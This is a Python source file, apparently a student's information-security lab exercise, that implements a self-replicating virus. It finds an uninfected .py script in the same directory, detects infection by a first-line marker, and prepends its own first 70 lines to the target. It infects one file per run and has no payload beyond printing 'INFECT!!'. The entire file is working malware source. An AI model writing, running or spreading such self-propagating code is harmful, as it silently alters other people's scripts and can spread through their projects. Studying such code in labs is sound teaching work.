#INFECTED
#virus for lab 1 of information security
#
#only effect files in the same directory
#only infect python scripts
#propgate virus 
#not infect already infected scripts
#only infects one file per run.

#first find a python file in the directory that has not been infected.
#second either re-write the target file or append the virus ontop of it.
#third have the virus do something?
import os
import glob
file_li = glob.glob('*.py') #creates list of files with .py extensions

def findFile(fileList):
    infected = True #variable for while loop
    fileCounter = 0 #variable to compare counter with size of .py list
    print (len(fileList))
    print (fileList)
    
    while infected == True:
        if fileCounter == len(fileList):
            return -1
        print (fileCounter)
        f = open(fileList[fileCounter], "r")
        firstLine = f.readline()
        f.close()

        f = open(os.path.abspath(__file__))
        infectedLine = f.readline()
        f.close()
        
        if firstLine != infectedLine:
            return fileCounter
        else:
            fileCounter += 1


def infect(targetFile):
    virusCode = open(os.path.abspath(__file__)) #opens itself to read virus
    virusString = ""
    for i, line in enumerate(virusCode):
        if i>=0 and i < 70: #Always make this number equal to the lines of code the file has.
            virusString += line
    virusCode.close

    f = open(targetFile)
    ogCode = f.read()
    f.close()

    f = open(targetFile, "w")
    f.write(virusString + ogCode) # writes virus and original target code to target file
    f.close()
    
targetFile = findFile(file_li)
print (file_li[targetFile])
print (file_li)
if targetFile > -1:
    infect(file_li[targetFile])
    print ("INFECT!!")
else:
    print ("All files in this directory have been infected")
